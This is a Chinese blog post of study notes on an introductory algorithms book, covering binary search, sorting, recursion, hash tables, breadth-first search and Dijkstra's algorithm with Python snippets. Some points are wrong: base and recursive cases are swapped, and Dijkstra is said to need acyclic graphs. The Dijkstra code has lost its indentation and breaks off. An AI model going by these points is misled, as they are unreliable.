    <content type="html"><![CDATA[<blockquote><p>对算法的了解一直很肤浅（听学数学的朋友说算法在数学中也叫数论？），本书阅读不求快，本就是入门读物，希望能尽量理解，争取早日拿下。</p><p>这边值得一提的是作者推荐了一个网站，可汗学院，<code>khanacademy.org</code>  mark一下。</p><p>看完40%来总结一下，非常好，文盲也能看懂的算法入门。</p><p>这本书看完应该会扫一眼结城浩的《图解密码学》</p></blockquote><a id="more"></a> <h2 id="第一章-算法简介"><a href="#第一章-算法简介" class="headerlink" title="第一章 算法简介"></a>第一章 算法简介</h2><h3 id="1-1-引言"><a href="#1-1-引言" class="headerlink" title="1.1 引言"></a>1.1 引言</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2w8rt2sg9j20fk026mxh.jpg" alt></p><p>好的，我具备了</p><h3 id="1-2-二分查找"><a href="#1-2-二分查找" class="headerlink" title="1.2 二分查找"></a>1.2 二分查找</h3><p>二分查找(binary search)又叫折半搜索(half-interval search)、对数搜索(logarithmic search)，是一种在<strong>有序数组</strong>中查找某一特定元素的搜索算法。搜索过程从数组的中间元素开始，如果中间元素正好是要查找的元素，则搜索过程结束；如果某一特定元素大于或者小于中间元素，则在数组大于或小于中间元素的那一半中查找，而且跟开始一样从中间元素开始比较。如果在某一步骤数组为空，则代表找不到。这种搜索算法每一次比较都使搜索范围缩小一半。</p><p>对数：幂运算的逆运算</p><p>假设你要在字典中查找一个单词，而该字典包含240000个单词，<br>你认为每种查找最多需要多少步？</p><p>log<sub>2</sub> n步，本题中就是18步</p><p>给定一个有序数组和一个需要定位的数字，先创建两个变量 low 和 high，low和high一开始分别是数组的第一个和最后一个坐标，划定一个取中间元素的空间，然后取出中间元素和目标元素比较，如果不是的话，就更改low或者high中某一个的坐标为(low + high)/2，将查找空间缩小为原来的二分之一，然后继续。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search</span><span class="params">(list, item)</span>:</span></span><br><span class="line">  low = <span class="number">0</span></span><br><span class="line">  high = len(list) - <span class="number">1</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    guess = list[mid]</span><br><span class="line">    <span class="keyword">if</span> guess == item:</span><br><span class="line">      <span class="keyword">return</span> mid</span><br><span class="line">    <span class="keyword">if</span> guess &gt; item:</span><br><span class="line">      high = mid <span class="number">-1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      low = mid + <span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">my_list = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> binary_search(my_list, <span class="number">3</span>)</span><br><span class="line"><span class="keyword">print</span> binary_search(my_list, <span class="number">-1</span>)</span><br></pre></td></tr></table></figure><p><a href="https://colab.research.google.com/notebook#create=true&amp;language=python3" target="_blank" rel="noopener">运行环境</a></p><p>Tips：关于为什么更换搜索区域的时候没有直接用high = mid 或者low = mid</p><p>注意while的条件，如果没有这一条，范围缩小到两个数的时候，会无限循环</p><h4 id="运行时间"><a href="#运行时间" class="headerlink" title="运行时间"></a>运行时间</h4><p>最多猜测次数与列表长度相同被称为线性时间(linear time).</p><p>二分查找的运行时间为对数时间(log time).</p><h3 id="1-3-大-O-表示法"><a href="#1-3-大-O-表示法" class="headerlink" title="1.3 大 O 表示法"></a>1.3 大 O 表示法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">O(1):             常量时间，哈希</span><br><span class="line">O(log2(n)):       对数时间，二分，</span><br><span class="line">O(n):             线性时间，简单</span><br><span class="line">O(nlog2(n)):              快速排序</span><br><span class="line">O(n2):                    选择排序（冒泡）</span><br><span class="line">O(n!):                    旅行商问题</span><br></pre></td></tr></table></figure><p>算法的速度指的并非时间，而是操作数的增速。</p><p>谈论算法的速度时，我们说的是随着输入的增加，其运行时间将以什么样的速度增加。</p><p>算法的运行时间用大O表示法表示。</p><p>O(log n)比O(n)快，当需要搜索的元素越多时，前者比后者快得越多。</p><h4 id="旅行商问题"><a href="#旅行商问题" class="headerlink" title="旅行商问题"></a>旅行商问题</h4><p>行商问题（最短路径问题）（英语：travelling salesman problem, TSP）是这样一个问题：给定一系列城市和每对城市之间的距离，求解访问每一座城市一次并回到起始城市的最短回路。它是组合优化中的一个NP困难问题，在运筹学和理论计算机科学中非常重要。</p><hr><h2 id="第二章-选择排序"><a href="#第二章-选择排序" class="headerlink" title="第二章 选择排序"></a>第二章 选择排序</h2><h3 id="2-1-内存工作原理"><a href="#2-1-内存工作原理" class="headerlink" title="2.1 内存工作原理"></a>2.1 内存工作原理</h3><h3 id="2-2-数组和链表"><a href="#2-2-数组和链表" class="headerlink" title="2.2 数组和链表"></a>2.2 数组和链表</h3><p><strong>链表</strong>：不需要移动元素，优势在插入元素</p><p>使用链表在中间插入元素只需要修改前面一个元素指向的地址，因此当需要在中间插入的时候，链表是更好的选择。</p><p>删除也是一样</p><p>数组和链表的运行时间：</p><table><thead><tr><th></th><th>数组</th><th>链表</th></tr></thead><tbody><tr><td>读取</td><td>O(1)</td><td>O(n)</td></tr><tr><td>插入</td><td>O(n)</td><td>O(1)</td></tr><tr><td>删除</td><td>O(n)</td><td>O(1)</td></tr></tbody></table><p>有两种访问方式：随机访问和顺序访问。</p><p>顺序访问意味着从第一个元素开始逐个读取元素，链表只能顺序访问，数组支持随机访问，所以数组在需要随机访问的情况下用得很多。</p><h3 id="2-3-选择排序"><a href="#2-3-选择排序" class="headerlink" title="2.3 选择排序"></a>2.3 选择排序</h3><p>时间复杂度的Tips</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g39qnoufddj20oz08a0v8.jpg" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findSmallest</span><span class="params">(arr)</span>:</span></span><br><span class="line">    smallest = arr[<span class="number">0</span>]</span><br><span class="line">    smallest_index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(arr)):</span><br><span class="line">        <span class="keyword">if</span> arr[i] &lt; smallest:</span><br><span class="line">            smallest = arr[i]</span><br><span class="line">            smallest_index = i</span><br><span class="line">    <span class="keyword">return</span> smallest_index</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">selection</span><span class="params">(arr)</span>:</span></span><br><span class="line">    newArr = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)):</span><br><span class="line">        smallest = findSmallest(arr)</span><br><span class="line">        newArr.append(arr.pop(smallest))</span><br><span class="line">    <span class="keyword">return</span> newArr</span><br><span class="line"></span><br><span class="line">print(selection( [<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">10</span>] ))</span><br></pre></td></tr></table></figure><p>Tips：</p><p>python之间的语法不兼容是很蛋疼的事情</p><p>py2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">"Pyhon 2 can use print string without ()"</span>;</span><br></pre></td></tr></table></figure><p>py3:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"Python3, print must use () to output string"</span>);</span><br></pre></td></tr></table></figure><p>py3中，print作为函数必须要带括号</p><h2 id="第三章-递归"><a href="#第三章-递归" class="headerlink" title="第三章 递归"></a>第三章 递归</h2><p>递归：优雅的问题解决办法</p><h3 id="3-1-递归"><a href="#3-1-递归" class="headerlink" title="3.1 递归"></a>3.1 递归</h3><p>“如果使用循环，程序的性能可能更高；如果使用递归，程序可能 更容易理解。如何选择要看什么对你来说更重要“</p><h3 id="3-2-基线条件和递归条件"><a href="#3-2-基线条件和递归条件" class="headerlink" title="3.2 基线条件和递归条件"></a>3.2 基线条件和递归条件</h3><p>递归条件(base case)是指函数调用自己，基线条件(recursive case)是指函数不再调用自己，从而表面形成无限循环。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">countdown</span><span class="params">(i)</span>:</span></span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">if</span> i &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        countdown(i<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">countdown(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><h3 id="3-3-栈"><a href="#3-3-栈" class="headerlink" title="3.3 栈"></a>3.3 栈</h3><p>调用栈（call stack）</p><p>python虽然不是用的JVM 但是 对于栈内存的调用 好像都差不多</p><p>递归函数factorial(5)写作5!</p><p>意义是5! = 5 <em> 4 </em> 3 <em> 2 </em> 1</p><p>使用栈虽然很方便但是也要付出代价：占用大量内存</p><h2 id="第四章-快速排序"><a href="#第四章-快速排序" class="headerlink" title="第四章 快速排序"></a>第四章 快速排序</h2><h3 id="4-1-分而治之"><a href="#4-1-分而治之" class="headerlink" title="4.1 分而治之"></a>4.1 分而治之</h3><p>一种著名的递归式问题解决方法—divide and conquer,D&amp;C</p><p>重要的D&amp;C是算法：快排，优雅代码的典范</p><p>欧几里得算法(辗转相除法)：gcd(a.b) = gcd(b, a%b)</p><table><thead><tr><th>大的那个数</th><th>小的那个数</th><th>余数</th><th>商</th></tr></thead><tbody><tr><td>a</td><td>b</td><td>r0 = a%b</td><td>q0</td></tr><tr><td>b</td><td>r0</td><td>r1 = b% r0</td><td>q1</td></tr><tr><td>r0</td><td>r1</td><td>r2 = r0 % r1</td><td>q2</td></tr><tr><td>…</td><td>…</td><td>…</td><td>…</td></tr><tr><td>rN-4</td><td>rN-3</td><td>rN-2 = rN-4 % rN-3</td><td>qN-2</td></tr><tr><td>rN-3</td><td>rN-2</td><td>rN-1 = rN-3 % rN-2</td><td>qN-1</td></tr><tr><td>rN-2</td><td>rN-1</td><td>rN = rN-2 % rN-1</td><td>qN</td></tr><tr><td>rN-1</td><td>rN == 0</td><td>rN-1 = 1 <em> rN-1 - 0 </em> rN</td><td>0</td></tr></tbody></table><p>得到的最大公约数就是rN-1</p><p>欧几里得算法的证明：</p><p>我个人觉得反证法比较好理解：</p><p> 要证欧几里德算法成立，即证: gcd(a,b)=gcd(b,r),其中 gcd是取最大公约数的意思，r=a mod b<br>    下面证 gcd（a，b）=gcd（b，r）<br>    设  c是a，b的最大公约数，即c=gcd（a，b），则有 a=mc，b=nc，其中m，n为正整数，且m，n互为质数<br>    由 r= a mod b可知，r= a- qb 其中，q是正整数，<br>    则 r=a-qb=mc-qnc=（m-qn）c<br>    b=nc,r=(m-qn)c，且n，（m-qn）互质（假设n，m-qn不互质，则n=xd, m-qn=yd 其中x,y,d都是正整数，且d&gt;1</p><p>​    则a=mc=(qx+y)dc, b=xdc,这时a,b 的最大公约数变成dc，与前提矛盾，所以n ，m-qn一定互质）<br>​    则gcd（b,r）=c=gcd（a,b）<br>​    得证。</p><p>编写涉及数组的递归函数时，基线条件通常是数组为空或只包含一个元素。陷入困境时， 请检查基线条件是不是这样的。 </p><h3 id="4-2-快排"><a href="#4-2-快排" class="headerlink" title="4.2 快排"></a>4.2 快排</h3><p>快排使用了D&amp;C</p><p>思路：</p><p>基线条件：数组为空或者只包含一个元素。这种情况下，只需要原样返回。</p><p>对于两个元素的数组：如果第一个元素比第二个元素小，直接返回，如果不是，就交换位置。</p><p>三个元素的数组：</p><p>从数组中选择一个元素，这个元素被称为基准值(pivot)，</p><p>我们暂时先将数组的第一个元素作为基准值。</p><p>接下来找出比基准值小的元素以及比他大的元素。这个过程被称为分区（partition）</p><p>这里两个分区出来的数组时无需的，但是如果这两个数组是有序的，对整个数组进行排序将非常容易。</p><p>那么问题就转化成了如何对子数组进行排序，</p><p>这里我们讨论的是特定情况（三个元素），无论选用哪个元素作为pivot，剩下的情况总能用上面两个元素数组的排序方法代入。</p><p>于是就得到了解决办法</p><p>接下来四个元素的情况，类似的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quicksort</span><span class="params">(array)</span>:</span></span><br><span class="line">    <span class="comment"># 基线条件</span></span><br><span class="line">    <span class="keyword">if</span> len(array) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> array</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 递归条件</span></span><br><span class="line">        pivot = array[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 分为两个数组</span></span><br><span class="line">        less = [ i <span class="keyword">for</span> i <span class="keyword">in</span> array[<span class="number">1</span>:] <span class="keyword">if</span> i &lt;= pivot]</span><br><span class="line">        greater = [i <span class="keyword">for</span> i <span class="keyword">in</span> array[<span class="number">1</span>:] <span class="keyword">if</span> i &gt; pivot]</span><br><span class="line">        <span class="keyword">return</span> quicksort(less) + [pivot] + quicksort(greater)</span><br><span class="line"></span><br><span class="line">print(quicksort([<span class="number">1</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">45645</span>,<span class="number">34</span>,<span class="number">23</span>,<span class="number">65</span>,<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><p>这边可以对比一下时间复杂度</p><p>选择排序的时间复杂度是O(n<sup>2</sup>)</p><p>快速排序的时间复杂度最差是O(n<sup>2</sup>)，平均情况是O(n log n)</p><p>还有一种合并排序(merge sort)运行时间是O(n log n)</p><p>现在做出一个有趣的假设，假设简单查找每次需要10ms，二分查找的常量是1s，现在我们假设查找的元素个数是10个，简单查找需要100ms，二分查找却需要log 10 * 1s，可以二分查找的时间远大于简单查找，但是我们查找的元素很大时，比如40亿，这个时候我们使用简单查找需要463天，但是二分查找只要32s。</p><p>通过这个例子，我们可以看到常量的影响可能会很大。</p><p>我们再来看快排，快排的效率取决于选择的pivot，当pivot是最小值的时候，我们其实只用到的一个数组，要递归很多次才能递归结束，这种情况是最坏的情况</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3c25jnmi2j20jx0ga0v4.jpg" alt></p><p>如果我们选择的是中间值，是最佳情况，这种情况下根本不要这么多递归，因此调用栈就短得多。</p><p>需要注意的是，我们并不是如图这么简单的+n次调用，作为递归二次每次调用栈都设计O(n)，这是递归的性质决定的。</p><p>因此，实际上最佳情况是O(n log n)</p><p>最佳情况也是平均情况（和最佳情况在同一数量级所以忽略掉前面的参数，剩下的相同），快排是D&amp;G的典范。</p><h2 id="第五章-散列表-Hash-Table"><a href="#第五章-散列表-Hash-Table" class="headerlink" title="第五章 散列表 Hash Table"></a>第五章 散列表 Hash Table</h2><blockquote><p>散列表是足有用的基本数据结构之一。</p></blockquote><p>虽然二分法的效率已经可以了，但是能不能有一种查找方法的查找时间是O(1)呢——任意给出一个查找内容，都能立即给出答案。</p><h3 id="5-1-散列函数"><a href="#5-1-散列函数" class="headerlink" title="5.1 散列函数"></a>5.1 散列函数</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g3eicbpqf2j20ar07y3z4.jpg" alt></p><p>散列函数应该满足的要求：</p><ul><li>他必须是一致的。例如：假设你输入apple时得到的是4，那么每次输入apple的时候，得到的都必须是4，如果不是这样，散列表将毫无用处。</li><li>它应该将不同的输入映射到不同的数字，如果一个散列函数不管输入是什么都返回1就不可以。最理想的情况是，将不同的输入映射到不同的数字。</li></ul><p>原理：</p><ul><li>散列函数总是将同样的输入映射到相同的索引。</li><li>不同输入映射到不同的索引。</li><li>散列函数知道数组有多大。</li></ul><p>散列表是一种包含额外逻辑的数据结构。</p><p>散列表又被称为散列映射、映射、字典和关联数组。（Hash Table）</p><p>python提供的散列表实现为字典，可以使用<code>dictt</code>来创建散列表。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g3ej8m95ydj20hm09omx2.jpg" alt></p><p>python语法中</p><p><code>book = dict()</code>和<code>book = {}</code>等价。</p><h3 id="5-2-应用案例"><a href="#5-2-应用案例" class="headerlink" title="5.2 应用案例"></a>5.2 应用案例</h3><p>电话簿</p><p>DNS解析（域名关联IP）DNS resolution</p><p>防止重复（比如抽奖、投票）</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g3ejoaiscwj20gr0743yd.jpg" alt></p><p>将案列表用作缓存</p><p>Facebook将主页、about页面，Contact页面、Terms 和 Conditions页面等众多页面通过页面URL映射到页面数据。</p><h3 id="5-3-冲突-collision"><a href="#5-3-冲突-collision" class="headerlink" title="5.3 冲突 collision"></a>5.3 冲突 collision</h3><p>大多数语言都提供了散列实现，冲突是指，两个键分配的数组位置相同，这是个问题。</p><p>解决办法：如果两个键映射到了同一个位置，就在这个位置存储一个链表。 </p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3fi55lqjgj20l606i74w.jpg" alt></p><p>但是，如果A开头的物品过多，散列表的效率将激素下降，然而：如果散列函数用的很好，这些列表就不会很长。</p><h3 id="5-4-性能"><a href="#5-4-性能" class="headerlink" title="5.4 性能"></a>5.4 性能</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3fi9iv10gj20d0071my4.jpg" alt></p><p>平均情况下，散列表的查找速度和数组一样快，而插入和删除速度与链表一样快，因此它兼具两者的优点！但是最糟的情况下，散列表的各种操作都很慢。</p><p>因此，为了避免冲突，需要有：</p><p>较低的填装因子。</p><p>良好的散列函数。</p><p>装填因子：</p><p>散列表包含的元素数目/位置总数</p><p>假设再散列表中存储100种商品的价格，散列表包含100个位置名最佳情况下，每个商品都将有自己的位置。</p><p>装填因子在大于1的情况下，需要在散列表中添加位置，这个操作被称为<strong>调整长度(resizing)</strong>。</p><p>一般操作是：<strong>数组增加一倍</strong>。</p><p>接下来，将所有元素用hash函数插入到新的散列表中。</p><p>平均而言，即便考虑到调整长度所需的时间，散列表操作所需的 时间也为O(1)。 </p><p>良好的散列函数让数组中的值呈均匀分布。 </p><p>糟糕的散列函数让值扎堆，导致大量的冲突。 </p><h2 id="第六章-广度优先搜索"><a href="#第六章-广度优先搜索" class="headerlink" title="第六章 广度优先搜索"></a>第六章 广度优先搜索</h2><blockquote><p>图算法之<em>广度优先搜索</em> (breadth-first search)</p></blockquote><h3 id="6-1-图简介"><a href="#6-1-图简介" class="headerlink" title="6.1 图简介"></a>6.1 图简介</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3finx3k1jj20jb07yq40.jpg" alt></p><p>如图用来解决从A点到B点最短路径问题的办法叫图计算方法。</p><p>这种最短路径既可能是最短路径，也有可能是国际象棋中将对方将死的最少步数。</p><p>解决最短路径问题的算法被称为<strong>广度优先搜索</strong>。</p><h3 id="6-2-图是什么"><a href="#6-2-图是什么" class="headerlink" title="6.2 图是什么"></a>6.2 图是什么</h3><p>图用于模拟不同的东西是如何相连的。</p><h3 id="6-3-广度优先搜索"><a href="#6-3-广度优先搜索" class="headerlink" title="6.3 广度优先搜索"></a>6.3 广度优先搜索</h3><p>书中的例计较简单，在朋友圈中找A，先遍历朋友，查找是否有A，有的话结束，没有的话，依次遍历朋友的朋友。（和之前找芒果经销商是一样的）</p><p>能够实现这种目的的数据结构叫做<strong>队列（queue）</strong></p><p>队列的工作原理：你不能随机访问队列中的元素。队列只支持两种操作：入队和出队。</p><p>队列是一种<strong>先进先出（First In First Out，FIFO）</strong>的数据结构，而栈是一种<strong>后进先出（Last In First Out，LIFO）</strong>的数据结构。 </p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3fj0qapdpj20cd04ddg7.jpg" alt></p><h3 id="6-4-实现图"><a href="#6-4-实现图" class="headerlink" title="6.4 实现图"></a>6.4 实现图</h3><p>python实现一个简单的图：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3fj7iusshj20f70azab9.jpg" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">graph = &#123;&#125; </span><br><span class="line">graph[<span class="string">"you"</span>] = [<span class="string">"alice"</span>, <span class="string">"bob"</span>, <span class="string">"claire"</span>] </span><br><span class="line">graph[<span class="string">"bob"</span>] = [<span class="string">"anuj"</span>, <span class="string">"peggy"</span>] </span><br><span class="line">graph[<span class="string">"alice"</span>] = [<span class="string">"peggy"</span>] </span><br><span class="line">graph[<span class="string">"claire"</span>] = [<span class="string">"thom"</span>, <span class="string">"jonny"</span>] </span><br><span class="line">graph[<span class="string">"anuj"</span>] = [] </span><br><span class="line">graph[<span class="string">"peggy"</span>] = [] </span><br><span class="line">graph[<span class="string">"thom"</span>] = [] </span><br><span class="line">graph[<span class="string">"jonny"</span>] = []</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3fj9dzn13j20mt04pwf5.jpg" alt></p><p>上图中的有向图和无向图是等价的。</p><h3 id="6-5-实现算法"><a href="#6-5-实现算法" class="headerlink" title="6.5 实现算法"></a>6.5 实现算法</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3fjb7w4rwj20jv0ls77b.jpg" alt></p><p>在Python中，可以使用函数deque来创建一个双端队列</p><p>这边需要考虑一个情况：就是朋友是朋友的朋友，循环调用会造成无限循环。</p><p>所以需要添加容错判断。用一个列表来记录检查过的人。</p><p>图的特殊情况：指针只往一个方向，比如说：族谱。</p><h2 id="第七章-狄克斯特拉算法-Dijkstra’s-Algorithm"><a href="#第七章-狄克斯特拉算法-Dijkstra’s-Algorithm" class="headerlink" title="第七章 狄克斯特拉算法 Dijkstra’s Algorithm"></a>第七章 狄克斯特拉算法 Dijkstra’s Algorithm</h2><h3 id="7-1-狄克斯特拉算法介绍"><a href="#7-1-狄克斯特拉算法介绍" class="headerlink" title="7.1 狄克斯特拉算法介绍"></a>7.1 狄克斯特拉算法介绍</h3><p>依旧图的讨论。</p><p>如果之前的路径有了权重（节点到节点之间花费的时间不等价），重新计算最短路径，就应该使用狄克斯特拉算法。</p><p>狄克斯特拉算法包含四个步骤：</p><ul><li>找出最便宜的节点，即可在最短时间内前往的节点。</li><li>对于该节点的邻居，检查是否有前往他们的最短路径，如果有，就更新其开销。</li><li>重复这个过程，知道对图中的每个节点都这样做了。</li><li>计算最终路径。</li></ul><h3 id="7-3-术语"><a href="#7-3-术语" class="headerlink" title="7.3 术语"></a>7.3 术语</h3><p>每条边关联的数字叫做权重（weight）。</p><p>带权重的图称为加权图（weighted graph），不带权重的图称为非加权图（unweighted graph）。</p><p>要计算非加权图中的最短路径，可以使用<strong>广度优先搜索</strong>。</p><p>如果是为了计算加权图中的最短路径，可以使用<strong>迪克斯特拉算法</strong>。</p><p>图还可能有环，这意味着你可以从一个节点出发，走一圈后又回到这个节点</p><p>在无向图中，每条边都是一个环，狄克斯特拉算法只使用于有向无环图（DAG）</p><h3 id="7-4-负权边"><a href="#7-4-负权边" class="headerlink" title="7.4 负权边"></a>7.4 负权边</h3><p>如果有负权边就不能用，就不能使用狄克斯特拉算法，因为负权边，就不能使用狄克斯特拉算法。</p><p>因为负权边会导致这种算法不管用。</p><p>因为：根据狄克斯特拉算法，没有比不支付任何费用获得海报更便宜的方式。</p><p>因此：不能将狄克斯特拉算法用于包含负权边的图。</p><p>要在包含负权边的图中，找出最短路径，可以使用另一种算法： 贝尔曼—福德算法（Bellman-Ford algorithm）.</p><h3 id="7-5-实现"><a href="#7-5-实现" class="headerlink" title="7.5 实现"></a>7.5 实现</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3gntz3sx0j20aa06fq38.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3gobfcl77j20fz0i4wek.jpg" alt></p><p>可以用以上代码表示上图的散列表。</p><p>上面代码表达的表：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3goeygswbj20b00a6dgw.jpg" alt></p><p>接下来需要一个散列表来粗春<strong>每个节点的开销</strong>。</p><p>节点的开销：从起点出发前往该节点需要的时间。</p><p>用表表示的话如图：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3gofc9opgj205805zdg6.jpg" alt></p><p>表中的无穷大可以这么表示：</p><p><a href="https://www.cnblogs.com/lvye-song/p/4029691.html" target="_blank" rel="noopener">python正负无穷</a></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3goiypuf7j20e205z0sk.jpg" alt></p><p>除了上面两张表，还需要一个存储父节点的散列表：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3gox0oz11j209g096wf7.jpg" alt></p><p>创建这个散列表的代码如下：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3gozpliz7j20aj05mjr7.jpg" alt></p><p>最后，需要一个数组用于记录处理过的节点，因为对于同一个节点，你不用处理多次。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">processd = &#123;&#125;</span><br></pre></td></tr></table></figure><p>动图表示整个认证过程：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3hv4x3xeqg207v066jrc.gif" alt></p><p>整体过程：</p><p>本书介绍的python 迪克斯特拉算法：</p><p>使用了三个散列表和一个数组，三个散列表的作用分别是：</p><p>第一个：Graph散列表</p><p>用来记录每个节点到指向节点的权重</p><p>第二个：Costs散列表</p><p>指的起点到某个节点的消耗</p><p>第三个：Parents散列表</p><p>指的是父节点的散列表</p><p>数组的作用是记录用于处理过的节点。</p><p>处理过程是，</p><p>找出一个未处理的节点（规则定位开销最小的）</p><p>然后在表一获得该节点的开销和邻居。</p><p>遍历邻居，</p><p>接着计算从起点到X再到邻居节点的距离，然后在表一中对比这样的开销和原先的开销大小，如果这样效率更高，那么在表二中替换掉（或者更新掉原先的数字），然后在表三中改变其父节点为X</p><p>（表二记载的开销是经过父节点的最短开销）</p><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">node = find_lowest_cost_node(costs)</span><br><span class="line"><span class="keyword">while</span> node <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">cost = costs[node]</span><br><span class="line">neighbors = graph[node]</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> neighbors.keys():</span><br><span class="line">new_cost = cost + neighbors[n]</span><br><span class="line"><span class="keyword">if</span> costs[n] &gt; new_cost:</span><br><span class="line">costs[n] = new_cost</span><br><span class="line">parents[n] = node</span><br><span class="line">processed.append(node)</span><br><span class="line">node = find_lowest_cost_node(costs)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_lowest_cost_node</span><span class="params">(costs)</span>:</span></span><br><span class="line">    lowest_cost = float(<span class="string">"inf"</span>)</span><br><span class="line">    lowest_cost_node = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> costs:</span><br><span class="line">        cost = costs[node]</span><br><span class="line">        <span class="keyword">if</span> cost &lt; lowest_cost <span class="keyword">and</span> node <span class="keyword">not</span> <span class="keyword">in</span> processed:</span><br><span class="line">        lowest_cost = cost</span><br><span class="line">            lowest_cost_node = node</span><br><span 